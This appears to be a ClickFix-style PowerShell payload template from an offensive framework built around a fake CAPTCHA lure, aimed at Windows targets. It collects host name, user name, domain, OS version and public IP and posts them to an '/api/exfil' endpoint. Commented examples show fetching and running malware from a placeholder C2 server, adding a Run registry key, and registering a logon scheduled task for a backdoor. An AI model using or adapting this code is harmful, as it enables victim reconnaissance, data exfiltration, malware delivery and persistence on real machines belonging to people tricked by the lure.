# ClickFix Default PowerShell Payload
# This payload can be used for Windows targets

Write-Host "[ClickFix] PowerShell Payload executing..."

# Collect system information
$info = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    UserDomain = $env:USERDOMAIN
    OS = [System.Environment]::OSVersion.VersionString
    PSVersion = $PSVersionTable.PSVersion.ToString()
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    PublicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content
}

Write-Host "[ClickFix] System Info:"
$info | Format-Table

# Send data back to server
try {
    $payloadData = @{
        lure = "captcha"
        hostname = $info.ComputerName
        username = $info.UserName
        os = $info.OS
        public_ip = $info.PublicIP
        output = "PowerShell payload executed successfully at $($info.Timestamp)"
    } | ConvertTo-Json -Compress

    $response = Invoke-WebRequest -Uri "http://localhost:8080/api/exfil" -Method POST -Body $payloadData -ContentType "application/json" -UseBasicParsing -TimeoutSec 10
    Write-Host "[ClickFix] Data sent to server. Response: $($response.StatusCode)"
} catch {
    Write-Host "[ClickFix] Failed to send data: $($_.Exception.Message)"
}

# You can add your custom PowerShell code here

# Example: Download and execute additional malware
# Invoke-WebRequest -Uri "https://your-c2-server.com/malware.exe" -OutFile "$env:TEMP\update.exe"
# Start-Process "$env:TEMP\update.exe"

# Example: Add to startup
# $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
# Set-ItemProperty -Path $path -Name "SystemUpdate" -Value "$env:TEMP\update.exe"

# Example: Establish persistence
# $scheduledTask = @{
#     Action = New-ScheduledTaskAction -Execute "$env:TEMP\backdoor.exe"
#     Trigger = New-ScheduledTaskTrigger -AtLogon
#     Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME
#     TaskName = "SystemUpdate"
# }
# Register-ScheduledTask @scheduledTask

Write-Host "[ClickFix] Payload completed"
